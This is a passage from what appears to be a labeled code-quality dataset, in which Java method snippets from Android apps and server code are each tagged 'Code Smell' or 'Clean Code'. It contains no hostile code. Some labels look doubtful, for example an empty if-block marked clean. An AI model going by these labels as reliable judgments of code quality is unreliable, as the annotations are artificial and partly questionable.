  updateAppearanceModifier();
  updatePhysicsModifier();
  updateEmitterState();
  if (mEmitterNeedsRestart) {
    mNativeEmitter.resetEmissionCycle();
    mEmitterNeedsRestart=false;
  }
}
",1,Code Smell
"public void updateForward(ArrayList<MessageObject> forwardMessages,long dialogId){
  hasCaption=false;
  hasSenders=false;
  isSecret=DialogObject.isEncryptedDialog(dialogId);
  multipleUsers=false;
  if (forwardMessages != null) {
    ArrayList<String> hiddenSendersName=new ArrayList<>();
    for (int i=0; i < forwardMessages.size(); ++i) {
      MessageObject messageObject=forwardMessages.get(i);
      if (!TextUtils.isEmpty(messageObject.caption)) {
        hasCaption=true;
      }
      if (!isSecret) {
        if (messageObject.messageOwner.fwd_from != null) {
          TLRPC.MessageFwdHeader header=messageObject.messageOwner.fwd_from;
          if (header.from_id == null && !hiddenSendersName.contains(header.from_name)) {
            hiddenSendersName.add(header.from_name);
          }
        }
      }
    }
    this.forwardMessages=new Messages(true,0,forwardMessages,dialogId,this.forwardMessages != null ? this.forwardMessages.selectedIds : null);
    if (this.forwardMessages.messages.isEmpty()) {
      this.forwardMessages=null;
    }
    ArrayList<Long> uids=new ArrayList<>();
    for (int a=0; a < forwardMessages.size(); a++) {
      MessageObject object=forwardMessages.get(a);
      long uid;
      if (object.isFromUser()) {
        uid=object.messageOwner.from_id.user_id;
      }
 else {
        TLRPC.Chat chat=MessagesController.getInstance(object.currentAccount).getChat(object.messageOwner.peer_id.channel_id);
        if (ChatObject.isChannel(chat) && chat.megagroup && object.isForwardedChannelPost()) {
          uid=-object.messageOwner.fwd_from.from_id.channel_id;
        }
 else {
          uid=-object.messageOwner.peer_id.channel_id;
        }
      }
      if (!uids.contains(uid)) {
        uids.add(uid);
      }
    }
    if (uids.size() + hiddenSendersName.size() > 1) {
      multipleUsers=true;
    }
  }
 else {
    this.forwardMessages=null;
  }
}",1,Code Smell
"private void updateStoriesPosting(){
  final boolean storiesEnabled=getMessagesController().storiesEnabled();
  if (this.storiesEnabled != storiesEnabled) {
    if (floatingButton2Container != null) {
      floatingButton2Container.setVisibility(onlySelect && initialDialogsType != 10 || folderId != 0 || !storiesEnabled || (searchItem != null && searchItem.isSearchFieldVisible()) || isInPreviewMode() ? View.GONE : View.VISIBLE);
    }
    updateFloatingButtonOffset();
    if (!this.storiesEnabled && storiesEnabled && storyHint != null) {
      storyHint.show();
    }
    this.storiesEnabled=storiesEnabled;
  }
  if (floatingButton == null || floatingButtonContainer == null) {
    return;
  }
  if (initialDialogsType == DIALOGS_TYPE_WIDGET) {
    floatingButton.setImageResource(R.drawable.floating_check);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""Done"",R.string.Done));
  }
 else   if (storiesEnabled) {
    floatingButton.setAnimation(R.raw.write_contacts_fab_icon_camera,56,56);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""AccDescrCaptureStory"",R.string.AccDescrCaptureStory));
  }
 else {
    floatingButton.setAnimation(R.raw.write_contacts_fab_icon,52,52);
    floatingButtonContainer.setContentDescription(LocaleController.getString(""NewMessageTitle"",R.string.NewMessageTitle));
  }
}",1,Code Smell
"public CustomPopupMenu(Context context,Theme.ResourcesProvider resourcesProvider,boolean containsSwipeBack){
  popupLayout=new ActionBarPopupWindow.ActionBarPopupWindowLayout(context,R.drawable.popup_fixed_alert2,resourcesProvider,containsSwipeBack ? ActionBarPopupWindow.ActionBarPopupWindowLayout.FLAG_USE_SWIPEBACK : 0);
  popupLayout.setAnimationEnabled(false);
  popupLayout.setOnTouchListener((v,event) -> {
    if (event.getActionMasked() == MotionEvent.ACTION_UP) {
      if (popupWindow != null && popupWindow.isShowing()) {
        v.getHitRect(AndroidUtilities.rectTmp2);
        if (!AndroidUtilities.rectTmp2.contains((int)event.getX(),(int)event.getY())) {
          popupWindow.dismiss();
        }
      }
    }
    return false;
  }
);
  popupLayout.setDispatchKeyEventListener(keyEvent -> {
    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_BACK && keyEvent.getRepeatCount() == 0 && popupWindow != null && popupWindow.isShowing()) {
      popupWindow.dismiss();
    }
  }
);
  popupLayout.setShownFromBottom(false);
  onCreate(popupLayout);
  popupWindow=new ActionBarPopupWindow(popupLayout,LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT);
  popupWindow.setAnimationEnabled(false);
  popupWindow.setAnimationStyle(R.style.PopupContextAnimation2);
  popupWindow.setOutsideTouchable(true);
  popupWindow.setClippingEnabled(true);
  popupWindow.setInputMethodMode(ActionBarPopupWindow.INPUT_METHOD_NOT_NEEDED);
  popupWindow.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_UNSPECIFIED);
  popupWindow.getContentView().setFocusableInTouchMode(true);
  popupWindow.setOnDismissListener(() -> {
    onDismissed();
    isShowing=false;
  }
);
}",1,Code Smell
"/** 
 * Replace hide operations with visibility changes on the exiting views. Instead of making the entire fragment's view GONE, make each exiting view INVISIBLE. At the end of the transition, make the fragment's view GONE.
 */
private static void replaceHide(FragmentTransitionImpl impl,Object exitTransition,Fragment exitingFragment,final ArrayList<View> exitingViews){
  if (exitingFragment != null && exitTransition != null && exitingFragment.mAdded && exitingFragment.mHidden && exitingFragment.mHiddenChanged) {
    exitingFragment.setHideReplaced(true);
    impl.scheduleHideFragmentView(exitTransition,exitingFragment.getView(),exitingViews);
    final ViewGroup container=exitingFragment.mContainer;
    OneShotPreDrawListener.add(container,new Runnable(){
      @Override public void run(){
        setViewVisibility(exitingViews,View.INVISIBLE);
      }
    }
);
  }
}
",1,Code Smell
"private void openCaptionEnter(){
  if (imageMoveAnimation != null || changeModeAnimation != null || currentEditMode != EDIT_MODE_NONE || sendPhotoType == SELECT_TYPE_AVATAR || sendPhotoType == SELECT_TYPE_WALLPAPER || sendPhotoType == SELECT_TYPE_QR) {
    return;
  }
  if (!windowView.isFocusable()) {
    makeFocusable();
  }
  keyboardAnimationEnabled=true;
  selectedPhotosListView.setEnabled(false);
  photosCounterView.setRotationX(0.0f);
  isPhotosListViewVisible=false;
  if (captionEditText.getMessageEditText() != null) {
    captionEditText.getMessageEditText().invalidateEffects();
    captionEditText.getMessageEditText().setText(captionEditText.getMessageEditText().getText());
  }
  captionEditText.setTag(1);
  captionEditText.openKeyboard();
  captionEditText.setImportantForAccessibility(View.IMPORTANT_FOR_ACCESSIBILITY_AUTO);
  lastTitle=actionBar.getTitle();
  captionEditText.setVisibility(View.VISIBLE);
}",1,Code Smell
"@Override protected void dispatchDraw(Canvas canvas){
  if (itemsEnterAnimator != null) {
    itemsEnterAnimator.dispatchDraw();
  }
  if (drawSelectorBehind && !selectorRect.isEmpty()) {
    selectorDrawable.setBounds(selectorRect);
    canvas.save();
    if (selectorTransformer != null) {
      selectorTransformer.accept(canvas);
    }
    selectorDrawable.draw(canvas);
    canvas.restore();
  }
  super.dispatchDraw(canvas);
  if (!drawSelectorBehind && !selectorRect.isEmpty()) {
    selectorDrawable.setBounds(selectorRect);
    canvas.save();
    if (selectorTransformer != null) {
      selectorTransformer.accept(canvas);
    }
    selectorDrawable.draw(canvas);
    canvas.restore();
  }
  if (overlayContainer != null) {
    overlayContainer.draw(canvas);
  }
  if (sectionsType == SECTIONS_TYPE_STICKY_HEADERS) {
    if (sectionsAdapter != null && !headers.isEmpty()) {
      for (int a=0; a < headers.size(); a++) {
        View header=headers.get(a);
        int saveCount=canvas.save();
        int top=(Integer)header.getTag();
        canvas.translate(LocaleController.isRTL ? getWidth() - header.getWidth() : 0,top);
        canvas.clipRect(0,0,getWidth(),header.getMeasuredHeight());
        header.draw(canvas);
        canvas.restoreToCount(saveCount);
      }
    }
  }
 else   if (sectionsType == SECTIONS_TYPE_DATE) {
    if (sectionsAdapter != null && pinnedHeader != null && pinnedHeader.getAlpha() != 0) {
      int saveCount=canvas.save();
      int top=(Integer)pinnedHeader.getTag();
      canvas.translate(LocaleController.isRTL ? getWidth() - pinnedHeader.getWidth() : 0,top);
      if (pinnedHeaderShadowDrawable != null) {
        pinnedHeaderShadowDrawable.setBounds(0,pinnedHeader.getMeasuredHeight(),getWidth(),pinnedHeader.getMeasuredHeight() + pinnedHeaderShadowDrawable.getIntrinsicHeight());
        pinnedHeaderShadowDrawable.setAlpha((int)(255 * pinnedHeaderShadowAlpha));
        pinnedHeaderShadowDrawable.draw(canvas);
        long newTime=SystemClock.elapsedRealtime();
        long dt=Math.min(20,newTime - lastAlphaAnimationTime);
        lastAlphaAnimationTime=newTime;
        if (pinnedHeaderShadowAlpha < pinnedHeaderShadowTargetAlpha) {
          pinnedHeaderShadowAlpha+=dt / 180.0f;
          if (pinnedHeaderShadowAlpha > pinnedHeaderShadowTargetAlpha) {
            pinnedHeaderShadowAlpha=pinnedHeaderShadowTargetAlpha;
          }
          invalidate();
        }
 else         if (pinnedHeaderShadowAlpha > pinnedHeaderShadowTargetAlpha) {
          pinnedHeaderShadowAlpha-=dt / 180.0f;
          if (pinnedHeaderShadowAlpha < pinnedHeaderShadowTargetAlpha) {
            pinnedHeaderShadowAlpha=pinnedHeaderShadowTargetAlpha;
          }
          invalidate();
        }
      }
      canvas.clipRect(0,0,getWidth(),pinnedHeader.getMeasuredHeight());
      pinnedHeader.draw(canvas);
      canvas.restoreToCount(saveCount);
    }
  }
}",1,Code Smell
"private void fillItems(ArrayList<UItem> items,UniversalAdapter adapter){
  items.add(UItem.asTopView(getString(R.string.BusinessLocationInfo),R.raw.biz_map));
  items.add(UItem.asCustom(editTextContainer));
  items.add(UItem.asShadow(null));
  items.add(UItem.asCheck(BUTTON_MAP,getString(R.string.BusinessLocationMap)).setChecked(geo != null));
  if (geo != null) {
    items.add(UItem.asCustom(mapPreviewContainer));
  }
  items.add(UItem.asShadow(null));
  if (clearVisible=(currentLocation != null && (geo != null || !TextUtils.isEmpty(address)))) {
    items.add(UItem.asButton(BUTTON_CLEAR,LocaleController.getString(R.string.BusinessLocationClear)).red());
    items.add(UItem.asShadow(null));
  }
  checkDone(true);
}
",1,Code Smell
"private Path getPath(String name,String type,Path defaultPath,String defaultUrl){
  Path path=arguments.file(name + ""_path"",name + "" "" + type+ "" path"",defaultPath);
  boolean refresh=arguments.getBoolean(""refresh_"" + name,""Download new version of "" + name + "" if changed"",refreshSources);
  boolean freeAfterReading=arguments.getBoolean(""free_"" + name + ""_after_read"",""delete "" + name + "" input file after reading to make space for output (reduces peak disk usage)"",false);
  if (downloadSources || refresh) {
    String url=arguments.getString(name + ""_url"",name + "" "" + type+ "" url"",defaultUrl);
    if ((!Files.exists(path) || refresh) && url != null) {
      toDownload.add(new ToDownload(name,url,path));
    }
  }
  inputPaths.add(new InputPath(name,path,freeAfterReading));
  return path;
}
",1,Code Smell
"void parseLogo(BrandingDslContext context,Tokens tokens,boolean restricted){
  if (tokens.hasMoreThan(LOGO_FILE_INDEX)) {
    throw new RuntimeException(""Too many tokens, expected: "" + LOGO_GRAMMAR);
  }
 else   if (tokens.includes(LOGO_FILE_INDEX)) {
    String path=tokens.get(1);
    if (path.startsWith(""data:image/"") || path.startsWith(""https://"") || path.startsWith(""http://"")) {
      if (IconUtils.isSupported(path)) {
        context.getWorkspace().getViews().getConfiguration().getBranding().setLogo(path);
      }
 else {
        throw new IllegalArgumentException(""Only PNG and JPG URLs and data URIs are supported: "" + path);
      }
    }
 else {
      if (!restricted) {
        File file=new File(context.getFile().getParent(),path);
        if (file.exists() && !file.isDirectory()) {
          try {
            String dataUri=ImageUtils.getImageAsDataUri(file);
            context.getWorkspace().getViews().getConfiguration().getBranding().setLogo(dataUri);
          }
 catch (          Exception e) {
            throw new RuntimeException(e);
          }
        }
 else {
          throw new RuntimeException(path + "" does not exist"");
        }
      }
    }
  }
 else {
    throw new RuntimeException(""Expected: "" + LOGO_GRAMMAR);
  }
}",1,Code Smell
"@SuppressLint(""RestrictedApi"") private String createNotificationShortcut(NotificationCompat.Builder builder,long did,String name,TLRPC.User user,TLRPC.Chat chat,Person person){
  if (unsupportedNotificationShortcut() || ChatObject.isChannel(chat) && !chat.megagroup) {
    return null;
  }
  try {
    String id=""ndid_"" + did;
    Intent shortcutIntent=new Intent(ApplicationLoader.applicationContext,OpenChatReceiver.class);
    shortcutIntent.setAction(""com.tmessages.openchat"" + Math.random() + Integer.MAX_VALUE);
    if (did > 0) {
      shortcutIntent.putExtra(""userId"",did);
    }
 else {
      shortcutIntent.putExtra(""chatId"",-did);
    }
    ShortcutInfoCompat.Builder shortcutBuilder=new ShortcutInfoCompat.Builder(ApplicationLoader.applicationContext,id).setShortLabel(chat != null ? name : UserObject.getFirstName(user)).setLongLabel(name).setIntent(new Intent(Intent.ACTION_DEFAULT)).setIntent(shortcutIntent).setLongLived(true).setLocusId(new LocusIdCompat(id));
    Bitmap avatar=null;
    if (person != null) {
      shortcutBuilder.setPerson(person);
      shortcutBuilder.setIcon(person.getIcon());
      if (person.getIcon() != null) {
        avatar=person.getIcon().getBitmap();
      }
    }
    ShortcutInfoCompat shortcut=shortcutBuilder.build();
    ShortcutManagerCompat.pushDynamicShortcut(ApplicationLoader.applicationContext,shortcut);
    builder.setShortcutInfo(shortcut);
    Intent intent=new Intent(ApplicationLoader.applicationContext,BubbleActivity.class);
    intent.setAction(""com.tmessages.openchat"" + Math.random() + Integer.MAX_VALUE);
    if (DialogObject.isUserDialog(did)) {
      intent.putExtra(""userId"",did);
    }
 else {
      intent.putExtra(""chatId"",-did);
    }
    intent.putExtra(""currentAccount"",currentAccount);
    IconCompat icon;
    if (avatar != null) {
      icon=IconCompat.createWithAdaptiveBitmap(avatar);
    }
 else     if (user != null) {
      icon=IconCompat.createWithResource(ApplicationLoader.applicationContext,user.bot ? R.drawable.book_bot : R.drawable.book_user);
    }
 else {
      icon=IconCompat.createWithResource(ApplicationLoader.applicationContext,R.drawable.book_group);
    }
    if (!NekoConfig.disableNotificationBubbles.Bool()) {
      NotificationCompat.BubbleMetadata.Builder bubbleBuilder=new NotificationCompat.BubbleMetadata.Builder(PendingIntent.getActivity(ApplicationLoader.applicationContext,0,intent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE),icon);
      bubbleBuilder.setSuppressNotification(openedDialogId == did);
      bubbleBuilder.setAutoExpandBubble(false);
      bubbleBuilder.setDesiredHeight(AndroidUtilities.dp(640));
      builder.setBubbleMetadata(bubbleBuilder.build());
    }
    return id;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return null;
}",1,Code Smell
"private boolean showRemoteServerAlert(){
  if (mPrefs.getBoolean(Prefs.PREF_REMOTE_COLLECTOR_ACK,false))   return false;
  if (((Prefs.getDumpMode(mPrefs) == Prefs.DumpMode.UDP_EXPORTER) && !Utils.isLocalNetworkAddress(Prefs.getCollectorIp(mPrefs))) || (Prefs.getSocks5Enabled(mPrefs) && !Utils.isLocalNetworkAddress(Prefs.getSocks5ProxyHost(mPrefs)))) {
    Log.i(TAG,""Showing possible scan notice"");
    AlertDialog dialog=new AlertDialog.Builder(this).setTitle(R.string.warning).setMessage(R.string.remote_collector_notice).setPositiveButton(R.string.ok,(d,whichButton) -> mPrefs.edit().putBoolean(Prefs.PREF_REMOTE_COLLECTOR_ACK,true).apply()).show();
    dialog.setCanceledOnTouchOutside(false);
    return true;
  }
  return false;
}",1,Code Smell
"@Override protected void before(MethodHookParam param) throws Throwable {
  ArrayList<String> blackList=new ArrayList<String>();
  blackList.add(""xx.yy.zz"");
  int topMethod=10;
  StackTraceElement[] stackTrace=Thread.currentThread().getStackTrace();
  for (  StackTraceElement el : stackTrace) {
    if (el != null && topMethod < 20 && (el.getClassName().contains(""edit.DockAppEditActivity"") || el.getClassName().contains(""BubblesSettings""))) {
      return;
    }
    topMethod++;
  }
  param.setResult(blackList);
}",1,Code Smell
"@Override public void build(LiteralArgumentBuilder<CommandSource> builder){
  builder.then(argument(""player"",PlayerListEntryArgumentType.create()).executes(context -> {
    MeteorExecutor.execute(() -> {
      PlayerListEntry lookUpTarget=PlayerListEntryArgumentType.get(context);
      UUID uuid=lookUpTarget.getProfile().getId();
      NameHistory history=Http.get(""https://laby.net/api/v2/user/"" + uuid + ""/get-profile"").sendJson(NameHistory.class);
      if (history == null || history.username_history == null || history.username_history.length == 0) {
        error(""There was an error fetching that users name history."");
        return;
      }
      String name=lookUpTarget.getProfile().getName();
      MutableText initial=Text.literal(name);
      initial.append(Text.literal(name.endsWith(""s"") ? ""'"" : ""'s""));
      Color nameColor=PlayerUtils.getPlayerColor(mc.world.getPlayerByUuid(uuid),Utils.WHITE);
      initial.setStyle(initial.getStyle().withColor(TextColor.fromRgb(nameColor.getPacked())).withClickEvent(new ClickEvent(ClickEvent.Action.OPEN_URL,""https://laby.net/@"" + name)).withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,Text.literal(""View on laby.net"").formatted(Formatting.YELLOW).formatted(Formatting.ITALIC))));
      info(initial.append(Text.literal("" Username History:"").formatted(Formatting.GRAY)));
      for (      Name entry : history.username_history) {
        MutableText nameText=Text.literal(entry.name);
        nameText.formatted(Formatting.AQUA);
        if (entry.changed_at != null && entry.changed_at.getTime() != 0) {
          MutableText changed=Text.literal(""Changed at: "");
          changed.formatted(Formatting.GRAY);
          DateFormat formatter=new SimpleDateFormat(""hh:mm:ss, dd/MM/yyyy"");
          changed.append(Text.literal(formatter.format(entry.changed_at)).formatted(Formatting.WHITE));
          nameText.setStyle(nameText.getStyle().withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,changed)));
        }
        if (!entry.accurate) {
          MutableText text=Text.literal(""*"").formatted(Formatting.WHITE);
          text.setStyle(text.getStyle().withHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,Text.literal(""This name history entry is not accurate according to laby.net""))));
          nameText.append(text);
        }
        ChatUtils.sendMsg(nameText);
      }
    }
);
    return SINGLE_SUCCESS;
  }
));
}",1,Code Smell
"/** 
 * inject action of spring
 * @param instance
 */
@Override public void injectService(Object instance){
  if (instance == null) {
    return;
  }
  if (JobSpringExecutor.getApplicationContext() == null) {
    return;
  }
  Field[] fields=instance.getClass().getDeclaredFields();
  for (  Field field : fields) {
    if (Modifier.isStatic(field.getModifiers())) {
      continue;
    }
    Object fieldBean=null;
    if (AnnotationUtils.getAnnotation(field,Resource.class) != null) {
      try {
        Resource resource=AnnotationUtils.getAnnotation(field,Resource.class);
        if (resource.name() != null && resource.name().length() > 0) {
          fieldBean=JobSpringExecutor.getApplicationContext().getBean(resource.name());
        }
 else {
          fieldBean=JobSpringExecutor.getApplicationContext().getBean(field.getName());
        }
      }
 catch (      Exception e) {
      }
      if (fieldBean == null) {
        fieldBean=JobSpringExecutor.getApplicationContext().getBean(field.getType());
      }
    }
 else     if (AnnotationUtils.getAnnotation(field,Autowired.class) != null) {
      Qualifier qualifier=AnnotationUtils.getAnnotation(field,Qualifier.class);
      if (qualifier != null && qualifier.value() != null && qualifier.value().length() > 0) {
        fieldBean=JobSpringExecutor.getApplicationContext().getBean(qualifier.value());
      }
 else {
        fieldBean=JobSpringExecutor.getApplicationContext().getBean(field.getType());
      }
    }
    if (fieldBean != null) {
      field.setAccessible(true);
      try {
        field.set(instance,fieldBean);
      }
 catch (      IllegalArgumentException e) {
        logger.error(e.getMessage(),e);
      }
catch (      IllegalAccessException e) {
        logger.error(e.getMessage(),e);
      }
    }
  }
}",1,Code Smell
"private static Map<String,ObjectResolvedType> indexFacetContainersByType(TypeResolver typeResolver){
  Map<String,ObjectResolvedType> facetContainers=new HashMap<>();
  for (  ObjectResolvedType objectResolvedType : typeResolver.getTypes()) {
    if (objectResolvedType.getContainer().equals(CONTAINER_CLASS_NAME) && objectResolvedType.hasAdditionalProperties() && objectResolvedType.getAdditionalPropertiesType() != null) {
      objectResolvedType.getAdditionalPropertiesType().accept(new DefaultResolvedTypeVisitor<Void>(){
        @Override public Void visit(        ObjectResolvedType objectType){
          facetContainers.put(objectType.getName(),objectResolvedType);
          return null;
        }
      }
);
    }
  }
  return facetContainers;
}
",1,Code Smell
"private boolean accessible(int opcode,MemberEntity originMember){
  boolean isStaticMember=TypeUtil.isStatic(originMember.access());
  if ((opcode == Opcodes.INVOKESTATIC) == isStaticMember || (opcode == Opcodes.GETSTATIC || opcode == Opcodes.PUTSTATIC) == isStaticMember) {
    return accessible(originMember);
  }
  return false;
}
private boolean accessible(MemberEntity member){
  if (className.equals(member.className())) {
    return true;
  }
  if (TypeUtil.isPublic(member.access())) {
    return true;
  }
 else   if (TypeUtil.isProtected(member.access())) {
    return Utils.getPackage(className).equals(Utils.getPackage(member.className())) || graph.get(this.className).inheritFrom(graph.get(member.className()));
  }
 else   if (TypeUtil.isPrivate(member.access())) {
    return false;
  }
 else {
    return Utils.getPackage(className).equals(Utils.getPackage(member.className()));
  }
}
",1,Code Smell
"@Override public boolean identityValidUserInfo(ClientBroker.AuthorizedInfo authorizedInfo,boolean isProduce,ProcessResult result){
  if (authorizedInfo == null) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Authorized Info is required!"");
    return result.isSuccess();
  }
  if (enableVisitTokenCheck) {
    long curVisitToken=authorizedInfo.getVisitAuthorizedToken();
    List<Long> currList=visitTokenList.get();
    if (tubeBroker.isKeepAlive()) {
      if (!currList.contains(curVisitToken) && (System.currentTimeMillis() - tubeBroker.getLastRegTime() > inValidTokenCheckTimeMs)) {
        result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Visit Authorized Token is invalid!"");
        return result.isSuccess();
      }
    }
  }
  if ((isProduce && !enableProduceAuthenticate) || (!isProduce && !enableConsumeAuthenticate)) {
    result.setSuccResult(new CertifiedInfo());
    return result.isSuccess();
  }
  if (TStringUtils.isBlank(authorizedInfo.getAuthAuthorizedToken())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""authAuthorizedToken is Blank!"");
    return result.isSuccess();
  }
  result.setSuccResult(new CertifiedInfo());
  return result.isSuccess();
}
",1,Code Smell
"private LargeSourceSet runRecipeCycles(Recipe recipe,LargeSourceSet sourceSet,ExecutionContext ctx,int maxCycles,int minCycles){
  WatchableExecutionContext ctxWithWatch=new WatchableExecutionContext(ctx);
  RecipeRunStats recipeRunStats=new RecipeRunStats(Recipe.noop());
  SourcesFileErrors errorsTable=new SourcesFileErrors(Recipe.noop());
  SourcesFileResults sourceFileResults=new SourcesFileResults(Recipe.noop());
  LargeSourceSet after=sourceSet;
  for (int i=1; i <= maxCycles; i++) {
    if (ctx.getMessage(PANIC) != null) {
      break;
    }
    Cursor rootCursor=new Cursor(null,Cursor.ROOT_VALUE);
    try {
      RecipeRunCycle<LargeSourceSet> cycle=new RecipeRunCycle<>(recipe,i,rootCursor,ctxWithWatch,recipeRunStats,sourceFileResults,errorsTable,LargeSourceSet::edit);
      ctxWithWatch.putCycle(cycle);
      after.beforeCycle(i == maxCycles);
      if (hasScanningRecipe(recipe)) {
        after=cycle.scanSources(after);
      }
      after=cycle.generateSources(after);
      after=cycle.editSources(after);
      boolean anyRecipeCausingAnotherCycle=false;
      for (      Recipe madeChanges : cycle.getMadeChangesInThisCycle()) {
        if (madeChanges.causesAnotherCycle()) {
          anyRecipeCausingAnotherCycle=true;
        }
      }
      if (i >= minCycles && (cycle.getMadeChangesInThisCycle().isEmpty() || !anyRecipeCausingAnotherCycle)) {
        after.afterCycle(true);
        break;
      }
      after.afterCycle(i == maxCycles);
      ctxWithWatch.resetHasNewMessages();
    }
  finally {
      rootCursor.clearMessages();
    }
  }
  recipeRunStats.flush(ctx);
  return after;
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void queryOaLeaveExamineList(){
  HrmAttendanceExamine hrmAttendanceExamine=attendanceExamineService.queryHrmAttendanceExamine();
  if (ObjectUtil.isNotNull(hrmAttendanceExamine)) {
  }
}
",0,Clean Code
"public NoRECOracle(G state,NoRECGenerator<Z,J,E,T,C> gen,ExpectedErrors expectedErrors){
  if (state == null || gen == null || expectedErrors == null) {
    throw new IllegalArgumentException(""Null variables used to initialize test oracle."");
  }
  this.state=state;
  this.gen=gen;
  this.errors=expectedErrors;
  this.reproducer=null;
}
",0,Clean Code
"List<ModuleEntity> getAll();
",0,Clean Code
"boolean createUserFolderIfNecessary(View newView,int container,CellLayout target,int[] targetCell,float distance,boolean external,DragObject d){
  if (distance > target.getFolderCreationRadius(targetCell))   return false;
  View v=target.getChildAt(targetCell[0],targetCell[1]);
  boolean hasntMoved=false;
  if (mDragInfo != null) {
    CellLayout cellParent=getParentCellLayoutForView(mDragInfo.cell);
    hasntMoved=(mDragInfo.cellX == targetCell[0] && mDragInfo.cellY == targetCell[1]) && (cellParent == target);
  }
  if (v == null || hasntMoved || !mCreateUserFolderOnDrop)   return false;
  mCreateUserFolderOnDrop=false;
  final int screenId=getIdForScreen(target);
  boolean aboveShortcut=(v.getTag() instanceof WorkspaceItemInfo);
  boolean willBecomeShortcut=(newView.getTag() instanceof WorkspaceItemInfo);
  if (aboveShortcut && willBecomeShortcut) {
    WorkspaceItemInfo sourceInfo=(WorkspaceItemInfo)newView.getTag();
    WorkspaceItemInfo destInfo=(WorkspaceItemInfo)v.getTag();
    if (!external) {
      getParentCellLayoutForView(mDragInfo.cell).removeView(mDragInfo.cell);
    }
    Rect folderLocation=new Rect();
    float scale=mLauncher.getDragLayer().getDescendantRectRelativeToSelf(v,folderLocation);
    target.removeView(v);
    mStatsLogManager.logger().withItemInfo(destInfo).withInstanceId(d.logInstanceId).log(LauncherEvent.LAUNCHER_ITEM_DROP_FOLDER_CREATED);
    FolderIcon fi=mLauncher.addFolder(target,container,screenId,targetCell[0],targetCell[1]);
    destInfo.cellX=-1;
    destInfo.cellY=-1;
    sourceInfo.cellX=-1;
    sourceInfo.cellY=-1;
    boolean animate=d != null;
    if (animate) {
      fi.setFolderBackground(mFolderCreateBg);
      mFolderCreateBg=new PreviewBackground();
      fi.performCreateAnimation(destInfo,v,sourceInfo,d,folderLocation,scale);
    }
 else {
      fi.prepareCreateAnimation(v);
      fi.addItem(destInfo);
      fi.addItem(sourceInfo);
    }
    return true;
  }
  return false;
}",0,Clean Code
"private static EGLConfig chooseEGLConfig(EGLDisplay display){
  EGLConfig[] configs=new EGLConfig[1];
  int[] numConfigs=new int[1];
  boolean success=EGL14.eglChooseConfig(display,EGL_CONFIG_ATTRIBUTES,0,configs,0,1,numConfigs,0);
  if (!success || numConfigs[0] <= 0 || configs[0] == null) {
    throw new GlException(Util.formatInvariant(""eglChooseConfig failed: success=%b, numConfigs[0]=%d, configs[0]=%s"",success,numConfigs[0],configs[0]));
  }
  return configs[0];
}",0,Clean Code
"@Override public Criterion createCriterion(){
  return new RecursionCriterion();
}
",0,Clean Code
"public void setVibrate(Integer num){
  this.vibrate=num;
}
",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)48);
    output.writeUInt32NoTag(entityId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)104);
    output.writeUInt32NoTag(dialogueEventId);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.entityId,entityId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.dialogueEventId,dialogueEventId);
  }
  output.endObject();
}",0,Clean Code
"/** 
 * Function which handles the selection of nodes in a path finding scenario. The function performs four BFS runs: BFS 1 searches for all successors of the start nodes. BFS 2 searches for all predecessors of the end nodes. BFS 2 searches for all predecessors of the start nodes. BFS 4 searches for all successors of the end nodes. <p>These four BFS runs are used in two sets: Set 1 is intersect of nodes reached through (BFS 1, BFS 2). Set 2 is intersect of nodes reached through (BFS 3, BFS 4). <p>Therefore Set 1 represents all nodes on paths if the set of start nodes contains parents of the newly selected node and Set 2 represents all nodes on paths if the set of start nodes contains child nodes of the newly selected node.
 * @param graph The graph in which the selection takes place.
 * @param alreadySelectedNodes The List of nodes already selected.
 * @param newlySelectedNode The node which is newly selected.
 */
@SuppressWarnings(""unchecked"") public static <NodeType extends ZyGraphNode<?>>void selectPath(final AbstractZyGraph<NodeType,?> graph,final ArrayList<NodeType> alreadySelectedNodes,final NodeType newlySelectedNode){
  final Function<NodeType,Node> function=new Function<NodeType,Node>(){
    @Override public Node apply(    final NodeType input){
      return input.getNode();
    }
  }
;
  final Collection<Node> foo=Collections2.transform(alreadySelectedNodes,function);
  final NodeList startNodes=new NodeList(foo.iterator());
  final NodeList endNodes=new NodeList(newlySelectedNode.getNode());
  final Set<Node> startSuccSet=new HashSet<Node>();
  final NodeList[] nodeListsStartSucc=Bfs.getLayers(graph.getGraph(),startNodes,Bfs.DIRECTION_SUCCESSOR,graph.getGraph().createNodeMap(),0);
  for (  final NodeList nodeList : nodeListsStartSucc) {
    startSuccSet.addAll(nodeList);
  }
  final Set<Node> endPredSet=new HashSet<Node>();
  final NodeList[] nodeListsEndPred=Bfs.getLayers(graph.getGraph(),endNodes,Bfs.DIRECTION_PREDECESSOR,graph.getGraph().createNodeMap(),0);
  for (  final NodeList nodeList : nodeListsEndPred) {
    endPredSet.addAll(nodeList);
  }
  final SetView<Node> startBeforeEndSetView=Sets.intersection(startSuccSet,endPredSet);
  if (!startBeforeEndSetView.isEmpty()) {
    for (    final Node node : startBeforeEndSetView) {
      graph.getGraph().setSelected(node,true);
    }
  }
  final Set<Node> startPredSet=new HashSet<Node>();
  final NodeList[] nodeListsStartPred=Bfs.getLayers(graph.getGraph(),startNodes,Bfs.DIRECTION_PREDECESSOR,graph.getGraph().createNodeMap(),0);
  for (  final NodeList nodeList : nodeListsStartPred) {
    startPredSet.addAll(nodeList);
